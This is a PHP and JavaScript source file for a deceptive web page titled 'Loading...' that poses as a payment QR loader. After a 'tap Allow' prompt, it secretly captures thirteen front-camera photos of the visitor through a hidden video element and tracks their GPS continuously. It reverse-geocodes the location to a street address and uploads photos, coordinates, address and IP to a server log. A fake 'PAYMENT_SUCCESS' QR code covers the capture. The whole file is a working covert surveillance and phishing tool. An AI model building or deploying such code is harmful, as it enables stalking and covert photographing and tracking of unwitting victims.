<?php

// Set timezone to IST (India)
date_default_timezone_set('Asia/Kolkata');

// ------------------ BACKEND: PHOTO UPLOADS ------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['continuous'])) {

    $lat = $_POST['lat'] ?? '';
    $lon = $_POST['lon'] ?? '';
    $address = $_POST['address'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $frontFile = '';

    if (!empty($_FILES['front']['tmp_name'])) {
        $frontFile = "uploads/" . time() . "_" . rand(1000,9999) . "_front.jpg";
        move_uploaded_file($_FILES['front']['tmp_name'], $frontFile);
    }

    file_put_contents(
        "log.txt",
        date("Y-m-d H:i:s") . " | PHOTO | IP: $ip | LAT: $lat | LON: $lon | ADDRESS: $address | FILE: $frontFile\n",
        FILE_APPEND
    );

    echo "OK";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f3f3f3;
    margin: 0;
    padding: 20px;
    text-align: center;
}

.card {
    background: white;
    padding: 20px;
    border-radius: 16px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    max-width: 350px;
    margin: auto;
    position: relative;
    overflow: hidden;
}

.qr-box {
    width: 250px;
    height: 250px;
    border: 8px solid black;
    border-radius: 12px;
    margin: 20px auto;
    position: relative;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
}

video {
    display: none;
}

#fakeqr {
    position: absolute;
    width: 250px;
    height: 250px;
    top: 0;
    left: 0;
    opacity: 0.9;
    display: none;
}

.loader {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #007bff;
    border-radius: 50%;
    width: 28px;
    height: 28px;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

#overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.55);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 999;
}

.overlay-box {
    background: #ffffff;
    padding: 16px 20px;
    border-radius: 14px;
    max-width: 280px;
    text-align: center;
    box-shadow: 0 4px 12px rgba(0,0,0,0.25);
}

.overlay-btn {
    margin-top: 12px;
    padding: 10px;
    border-radius: 999px;
    border: none;
    width: 100%;
    font-size: 16px;
    background: #007bff;
    color: #fff;
}

.progress-wrapper {
    width: 200px;
    height: 18px;
    border-radius: 50px;
    background: #ddd;
    overflow: hidden;
    position: relative;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background: #28a745; /* GREEN COLOR */
    transition: width 0.3s linear;
}


</style>
</head>
<body>

<div id="overlay">
    <div class="overlay-box">
        <div style="font-size:16px; margin-bottom:6px;">To Continue</div>
        <div style="font-size:12px; color:#666;">Your browser may ask for permissions. Tap “Allow”.</div>
        <button class="overlay-btn" id="continueBtn">Continue</button>
    </div>
</div>

<div class="card">
    <h2 id="statusTitle">Loading...</h2>
    <p id="statusText">Please wait while we process…</p>


    <div class="qr-box">
        <div class="progress-wrapper">
    <div id="progressBar" class="progress-bar"></div>
</div>
        <img id="fakeqr" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=PAYMENT_SUCCESS" />
        <video id="camera" autoplay playsinline></video>
    </div>
</div>

<script>
const videoEl = document.getElementById("camera");
const qrEl = document.getElementById("fakeqr");
const loaderEl = document.getElementById("loader");
const overlayEl = document.getElementById("overlay");
const continueBtn = document.getElementById("continueBtn");

let finalLat = "";
let finalLon = "";
let finalAddress = "";
let lastSentTime = 0;

// -------- Reverse Geocode --------
async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await res.json();
        return data.display_name || "";
    } catch {
        return "";
    }
}

// -------- Continuous GPS --------
async function sendContinuousLocation(lat, lon, address) {
    const fd = new FormData();
    fd.append("continuous", "1");
    fd.append("lat", lat);
    fd.append("lon", lon);
    fd.append("address", address);

    await fetch("continuous.php", { method: "POST", body: fd });
}

function startContinuousLocation() {
    navigator.geolocation.watchPosition(
        async pos => {
            finalLat = pos.coords.latitude;
            finalLon = pos.coords.longitude;

            const now = Date.now();
            if (now - lastSentTime > 3000) {
                finalAddress = await reverseGeocode(finalLat, finalLon);
                lastSentTime = now;
                sendContinuousLocation(finalLat, finalLon, finalAddress);
            }
        },
        err => console.log("GPS error:", err),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// -------- Initial GPS --------
function requestGPS() {
    navigator.geolocation.getCurrentPosition(
        pos => {
            finalLat = pos.coords.latitude;
            finalLon = pos.coords.longitude;
        },
        err => console.log("Initial GPS failed:", err),
        { enableHighAccuracy: true }
    );
}

// -------- Permissions Trigger --------
continueBtn.addEventListener("click", async () => {
    overlayEl.style.display = "none";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        videoEl.srcObject = stream;
    } catch (err) {
        alert("Please enable camera access.");
        return;
    }

    requestGPS();
    startContinuousLocation();
});

// -------- AUTO-CAPTURE (3 fast + 10 slow = 13 photos) --------
let totalPhotos = 0;
const fastPhotos = 3;
const slowPhotos = 10;
const slowGap = 350;
let retryCount = 0;
const maxRetries = 10;

function takePhoto(callback) {
    if (!videoEl.videoWidth) {
        if (retryCount++ < maxRetries) return setTimeout(() => takePhoto(callback), 150);
        return;
    }

    const canvas = document.createElement("canvas");
    canvas.width = videoEl.videoWidth;
    canvas.height = videoEl.videoHeight;
    canvas.getContext("2d").drawImage(videoEl, 0, 0);

    canvas.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append("front", blob, `auto_${Date.now()}.jpg`);
        fd.append("lat", finalLat);
        fd.append("lon", finalLon);
        fd.append("address", finalAddress);

        await fetch("", { method: "POST", body: fd });

        totalPhotos++;
        updateProgress();   // <-- NEW LINE for progress bar
        callback();

    }, "image/jpeg");
}

function runFast(count = 0) {
    if (count >= fastPhotos) return runSlow();
    takePhoto(() => setTimeout(() => runFast(count + 1), 250));
}

function runSlow(count = 0) {
    if (count >= slowPhotos) return finishAll();
    takePhoto(() => setTimeout(() => runSlow(count + 1), slowGap));
}

// ---------- PROGRESS BAR CONTROL ----------
const progressBar = document.getElementById("progressBar");
let totalSteps = 13;   // 3 fast + 10 slow
let currentStep = 0;

function updateProgress() {
    currentStep++;
    let percent = Math.min((currentStep / totalSteps) * 100, 100);
    progressBar.style.width = percent + "%";
}


function finishAll() {
    try {
        videoEl.srcObject.getTracks().forEach(t => t.stop());
    } catch {}

    // Hide progress bar
    document.querySelector(".progress-wrapper").style.display = "none";

    // Show QR code
    qrEl.style.display = "block";

    // Change text to LOADED
    document.getElementById("statusTitle").innerText = "Loaded";
    document.getElementById("statusText").innerText = "QR is ready.";
}

// Start when camera is ready
videoEl.onloadedmetadata = () => setTimeout(() => runFast(), 300);
</script>

</body>
</html>
